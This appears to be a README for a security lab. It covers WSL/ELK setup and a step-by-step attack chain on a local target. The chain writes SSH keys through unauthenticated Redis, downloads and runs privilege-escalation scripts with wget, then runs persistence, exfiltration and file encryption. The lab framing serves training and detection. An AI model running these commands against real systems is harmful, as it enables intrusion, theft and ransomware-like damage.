# Preparing the Setup (Pre-requisites)

## Change docker-desktop settings (increase RAM and max virtual memory required by ELK)
- Go to %UserProfile%
- Create a file .wslconfig
- Edit to include the following below:

```
# Settings apply across all Linux distros running on WSL 2
[wsl2]
kernelCommandLine = "sysctl.vm.max_map_count=262144"
# Limits VM memory to use no more than 5 GB, this can be set as whole numbers using GB or MB
memory=5GB
```
References:
- https://mrakelinggar.medium.com/set-up-configs-like-memory-limits-in-docker-for-windows-and-wsl2-80689997309c
- https://stackoverflow.com/questions/69214301/using-docker-desktop-for-windows-how-can-sysctl-parameters-be-configured-to-per
- https://gist.github.com/audionerd/d7d77d9af080a7a87d9b

# Setting up the Attack Environment

1. Bring up all the containers:
```
vagrant up --no-parallel
```
2. Start metricbeat in the ELK container. Open the terminal (docker terminal or external) and enter:
```
service metricbeat start && metricbeat setup -e
```

# Exploit Manual/Steps
1. Reverse shell into the target
```
sudo ssh -i ~/.ssh/id_rsa resch@172.18.0.2

# Accepts the prompt to trust connection
yes
```
Should the connection not work (still asked for password), run the following commands again:
```
printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authorized_keys'\nsave\nexit" | redis-cli -h 172.18.0.2

sudo ssh -i ~/.ssh/id_rsa resch@172.18.0.2

yes
```

2. Download all attack scripts which also executes privilege escalation exploiting Crobjob
```
wget https://raw.githubusercontent.com/S692/ossas/main/Gp5_import_scripts_and_PE.sh && chmod +x Gp5_import_scripts_and_PE.sh

# Downloads scripts and run PE exploit
./Gp5_import_scripts_and_PE.sh

# ONLY IF YOU did not successfully become root, execute the following command:
cd /home/resch/.scripts
./Gp5_PEexploitSudo.sh
```
3. Run the attack chain scripts chaining persistence to encryption
```
cd /home/resch/.scripts
./Gp5_attack_chain.sh
```
Alternatively, it can be executed one by one:
```
cd /home/resch/.scripts
./check.sh
pip3 install -r ./requirements.txt
./Gp5_persistence1.sh
./Gp5_file_and_dir_discovery.sh
./Gp5_collectiontarget.sh
./Gp5_exfiltration_target.sh
python3 Gp5_encrypt.py fndd-stripped.txt
```
4. After exfiltration, the encrypted exfiltrated files can be decrypted on the attacker's machine
```
cd ~

./Gp5_after_exfiltration_attk.sh

cd /home/vagrant/exfiltrated/exfiltrate_backups_decrypted

ls -la
```
